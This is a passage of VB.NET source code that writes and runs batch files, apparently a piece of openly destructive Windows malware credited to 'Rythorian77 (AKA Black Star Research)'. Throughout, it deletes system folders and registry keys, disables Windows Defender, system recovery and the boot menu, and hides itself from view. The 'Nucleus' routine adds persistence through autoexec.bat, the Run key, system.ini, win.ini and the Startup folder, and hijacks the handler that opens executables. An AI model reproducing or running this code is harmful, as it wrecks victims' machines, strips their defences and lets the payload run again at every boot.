            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("taskkill /im wpscenter.exe /f")
            rythorian77.Append("del ""%USERPROFILE%\AppData\Local\Kingsoft\WPS Office\10.1.0.5775\office6\wpscenter.exe"" /s /f /q")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("taskkill /im wpscloudsvr.exe /f")
            rythorian77.Append("del ""%USERPROFILE%\AppData\Local\Kingsoft\WPS Office\10.1.0.5775\office6\wpscloudsvr.exe"" /s /f /q")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("rd ""%SystemDrive%\AMD"" /s /q")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("rd ""%SystemDrive%\drivers"" /s /q")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("rd ""%SystemDrive%\Users\defaultuser0"" /s /q")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("rd ""%USERPROFILE%\AppData\Local\Kingsoft\WPS Office\10.1.0.5775\wtoolex"" /s /q")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("rd ""%WINDIR%\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy"" /s /q")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("taskkill /im mobsync.exe /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("del ""%WINDIR%\System32\mobsync.exe"" /s /f /q")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("rd ""%ProgramFiles%\WindowsPowerShell"" /s /q")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("rd ""%ProgramFiles(x86)%\WindowsPowerShell"" /s /q")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("rd ""%WINDIR%\System32\WindowsPowerShell"" /s /q")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("rd ""%WINDIR%\SysWOW64\WindowsPowerShell"" /s /q")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("del ""%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\*"" /s /f /q")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("del ""%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*"" /s /f /q")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKCU\Software\Microsoft\Command Processor"" /v ""AutoRun"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKCU\Software\Policies"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Command Processor"" /v ""AutoRun"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Policies"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Run"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\WindowsStore\WindowsUpdate"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\WindowsStore\WindowsUpdate"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows"" /v ""AppInit_DLLs"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""Shell"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""Userinit"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""VMApplet"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Taskman"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Policies"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\WOW6432Node\Microsoft\Policies"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Policies"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\WindowsStore\WindowsUpdate"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows"" /v ""AppInit_DLLs"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""Shell"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""Userinit"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""VMApplet"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon\Taskman"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\Software\WOW6432Node\Policies"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\System\CurrentControlSet\Control\Keyboard Layout"" /v ""Scancode Map"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\System\CurrentControlSet\Control\SafeBoot"" /v ""AlternateShell"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\System\CurrentControlSet\Control\Session Manager"" /v ""BootExecute"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\System\CurrentControlSet\Control\Session Manager"" /v ""Execute"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\System\CurrentControlSet\Control\Session Manager"" /v ""SETUPEXECUTE"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\System\CurrentControlSet\Control\Terminal Server\Wds\rdpwd"" /v ""StartupPrograms"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"bcdedit /deletevalue {{current}} safeboot")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"bcdedit /deletevalue {{default}} safeboot")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"bcdedit /set {{default}} advancedoptions false")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"bcdedit /set {{default}} bootems no")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"bcdedit /set {{default}} recoveryenabled no")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"bcdedit /set {{bootmgr}} displaybootmenu no")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"bcdedit /set {{current}} advancedoptions false")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"bcdedit /set {{current}} bootems no")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"bcdedit /set {{current}} recoveryenabled no")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""EvtMgr6"" /t REG_SZ /d ""C:\Program Files\Logitech\SetPointP\SetPoint.exe /launchGaming"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""Shell"" /t REG_SZ /d ""explorer.exe"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""Userinit"" /t REG_SZ /d ""C:\Windows\System32\userinit.exe,"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""Shell"" /t REG_SZ /d ""explorer.exe"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\System\CurrentControlSet\Control\Session Manager"" /v ""BootExecute"" /t REG_MULTI_SZ /d ""autocheck autochk *"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\System\CurrentControlSet\Control\Session Manager"" /v ""SETUPEXECUTE"" /t REG_MULTI_SZ /d "" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("%SystemDrive%\Users\defaultuser0")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("%ProgramFiles%\WindowsPowerShell")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("%ProgramFiles(x86)%\WindowsPowerShell")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("%WINDIR%\System32\mobsync.exe")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("%WINDIR%\System32\WindowsPowerShell")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("takeown /f ""%WinDir%\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy"" /a /r /d yicacls ""%WinDir%\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy"" /inheritance:r /grant:r Administrators:(OI)(CI)F /t /ctaskkill /im SearchUI.exe /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("%WINDIR%\SysWOW64\WindowsPowerShell")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"HKCR\CLSID\{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}\ShellFolder")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("Dism /Image:C:\test\offline /Disable-Feature /FeatureName:TFTP /Remove")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:MediaPlayback /Quiet /NoRestart")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:MicrosoftWindowsPowerShellV2 /Quiet /NoRestart")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:MicrosoftWindowsPowerShellV2Root /Quiet /NoRestart")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:Printing-PrintToPDFServices-Features /Quiet /NoRestart")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:Printing-XPSServices-Features /Quiet /NoRestart")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:SearchEngine-Client-Package /Quiet /NoRestart")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:WCF-TCP-PortSharing45 /Quiet /NoRestart")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:WorkFolders-Client /Quiet /NoRestart")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:Xps-Foundation-Xps-Viewer /Quiet /NoRestart")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("Dism /Online /Enable-Feature /FeatureName:NetFx3 /All")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableSR"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableConfig"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("schtasks /Change /TN ""Microsoft\Windows\SystemRestore\SR"" /Enable")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("vssadmin Resize ShadowStorage /For=C: /On=C: /Maxsize=5GB")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("sc config wbengine start= demand")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("sc config swprv start= demand")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("sc config vds start= demand")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("sc config VSS start= demand")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("1 - Disable Real-time protection")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\System\CurrentControlSet\Services\Sense"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\System\CurrentControlSet\Services\WdFilter"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\System\CurrentControlSet\Services\WdNisSvc"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\System\CurrentControlSet\Services\WinDefend"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("delete ""HKCR\*\shellex\ContextMenuHandlers\EPP"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("delete ""HKCR\Directory\shellex\ContextMenuHandlers\EPP"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("delete ""HKCR\Drive\shellex\ContextMenuHandlers\EPP"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"" /v ""{{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}}"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"" /v ""{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"" /v ""{{645FF040-5081-101B-9F08-00AA002F954E}}"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"" /v ""{{20D04FE0-3AEA-1069-A2D8-08002B30309D}}"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"" /v ""{{59031a47-3f72-44a7-89c5-5595fe6b30ee}}"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v ""EnableCursorSuppression"" /t REG_DWORD /d ""0"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Search"" /v ""BingSearchEnabled"" /t REG_DWORD /d ""0"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Search"" /v ""CortanaEnabled"" /t REG_DWORD /d ""0"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Search"" /v ""SearchboxTaskbarMode"" /t REG_DWORD /d ""0"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKCU\Software\Policies\Microsoft\Windows\Explorer"" /v ""DisableNotificationCenter"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v ""HideSCANetwork"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v ""HideSCAPower"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v ""HideSCAVolume"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\Software\Microsoft\Driver Signing"" /v ""Policy"" /t REG_BINARY /d ""01"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Device Metadata"" /v ""PreventDeviceMetadataFromNetwork"" /t REG_DWORD /d ""1"" /f ")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("schtasks /Change /TN ""Microsoft\Windows\Device Setup\Metadata Refresh"" /Disable")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\DriverSearching"" /v ""SearchOrderConfig"" /t REG_DWORD /d ""0"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v ""Disabled"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\Windows Error Reporting"" /v ""Disabled"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v ""DontSendAdditionalData"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\Windows Error Reporting"" /v ""DontSendAdditionalData"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v ""DontShowUI"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\Windows Error Reporting"" /v ""DontShowUI"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v ""LoggingDisabled"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\Windows Error Reporting"" /v ""LoggingDisabled"" /t REG_DWORD /d ""1"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append($"reg add ""HKCR\CLSID\{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}\ShellFolder"" /v ""Attributes"" /t REG_DWORD /d ""2962489444"" /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.AppendLine("cls()")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.AppendLine("CreateObject(""Wscript.Shell"").Run ""HyperNova.bat"", 0, True")
            rythorian77.AppendLine("GoTo begin")

            File.WriteAllText("HyperNova.bat", rythorian77.ToString())

            Process.Start("HyperNova.bat")
        Catch ex As Exception
            Debug.WriteLine(ex.Message, "Error")
        End Try

    End Sub

    REM *Disables Recovery Options in windows
    REM *Disable Startup Repair from trying to start when a problem is detected
    REM *Disable Windows recovery at startup
    REM *Adds to startup via multiple methods:
    REM *Copy's itself into the autoexec.bat
    REM *HAT method (Hooking Autoexec.bat)
    REM *Registry
    REM *System.ini
    REM *Win.ini
    REM *Startup folder
    REM *Shell Spawning
    REM *Disable Mouse & Keyboard

    Private Sub Nucleus()
        On Error GoTo Err
        Dim rythorian77 As New StringBuilder
        rythorian77.AppendLine("@echo off")
        rythorian77.AppendLine("Title: Batch (Nucleus PathoHack) by: Rythorian77 (AKA Black Star Research)")
        rythorian77.AppendLine(":Commandline")
        rythorian77.AppendLine("IF [""%~1""]==[""-e""] GoTo o")
        rythorian77.AppendLine(":Clear vbs")
        rythorian77.AppendLine("set Batch=%~dpnx0")
        rythorian77.AppendLine("(")
        rythorian77.AppendLine("echo set objshell ^= createobject^(""wscript.shell""^)")
        rythorian77.AppendLine("echo objshell^.run ""%Batch% -e""^,vbhide ) > %temp%\bas.vbs")
        rythorian77.AppendLine("start %temp%\bas.vbs")
        rythorian77.AppendLine("exit")
        rythorian77.AppendLine(":o")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.AppendLine("setlocal enableDelayedExpansion")
        rythorian77.AppendLine("attrib -r -h C:\autoexec.bat")
        rythorian77.AppendLine("attrib +r +h C:\autoexec.bat")
        rythorian77.Append("set mydir=%~dp0")
        rythorian77.Append("bcdedit /set recoveryenabled No")
        rythorian77.AppendLine("bcdedit /set bootstatuspolicy ignoreallfailures")
        rythorian77.AppendLine("copy %0 C:\startup.bat")
        rythorian77.AppendLine("goto startup")
        rythorian77.Append(":startup")
        rythorian77.AppendLine(":: HAT")
        rythorian77.AppendLine("attrib -r -h C:\autoexec.bat")
        rythorian77.AppendLine("copy %0 C:\WinServ.bat >nul")
        rythorian77.AppendLine("type C:\autoexec.bat|find ""WinServ.bat"">C:\autoexec.bat")
        rythorian77.AppendLine("attrib +r +h C:\autoexec.bat")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WinBoot /t REG_SZ /d C:\startup.bat")
        rythorian77.AppendLine("copy %0 %windir%\WinDebug.bat")
        rythorian77.AppendLine("find /v /i ""[boot]""<%WiNDir%\system.ini>temp1.tmp")
        rythorian77.AppendLine("find /v /i ""shell=explorer.exe""<temp1.tmp>temp2.tmp")
        rythorian77.AppendLine("echo [boot]>%wIndIR%\system.ini")
        rythorian77.AppendLine("echo Shell=Explorer.exe WinDebug.bat>>%wiNdIR%\system.ini")
        rythorian77.AppendLine("type temp2.tmp>>%WIndIR%\system.ini")
        rythorian77.AppendLine("del temp?.tmp")
        rythorian77.AppendLine(":: Win.ini")
        rythorian77.AppendLine("copy %0 %windir%\TaskLoad.bat.")
        rythorian77.AppendLine("find /v /i ""[windows]""<%windir%\win.ini>temp1.tmp")
        rythorian77.AppendLine("find /v /i ""load=""<temp1.tmp>temp2.tmp")
        rythorian77.AppendLine("find /v /i ""run=""<temp2.tmp>temp1.tmp")
        rythorian77.AppendLine("find /v /i ""NullPort=""<temp1.tmp>temp2.tmp")
        rythorian77.AppendLine("echo [windows]>%wiNdIR%\win.ini")
        rythorian77.AppendLine("echo load=TaskLoad.bat>>%winDIr%\win.ini")
        rythorian77.AppendLine("echo run=>>%wINDir%\win.ini")
        rythorian77.AppendLine("echo NullPort=None>>%windIr%\win.ini")
        rythorian77.AppendLine("type temp2.tmp>>%wiNDir%\win.ini")
        rythorian77.AppendLine("del temp?.tmp")
        rythorian77.AppendLine(":: Startup Folder")
        rythorian77.AppendLine("Copy %0 C:\startup.bat")
        rythorian77.AppendLine("copy C:\startup.bat ""%UserProfile%\Start Menu\Programs\Startup")
        rythorian77.AppendLine(":: Shell Spawning")
        rythorian77.AppendLine("Copy %0 C:\startup.bat")
        rythorian77.AppendLine("echo.on error resume next>temp.vbs")
        rythorian77.AppendLine("echo set sh=createobject(""wscript.shell"")>>temp.vbs")
        rythorian77.AppendLine("echo sh.regwrite ""HKCR\exefile\Shell\Open\Command"",""wscript.exe C:\CmdLoad.vbs ""%%1 %%*"">>temp.vbs")
        rythorian77.AppendLine("cscript temp.vbs")
        rythorian77.AppendLine("del temp.vbs")
        rythorian77.AppendLine("echo.set shell = createobject(""wscript.shell"")>>C:\CmdLoad.vbs")
        rythorian77.AppendLine("echo.shell.run ""C:\startup.bat"">>C:\CmdLoad.vbs")
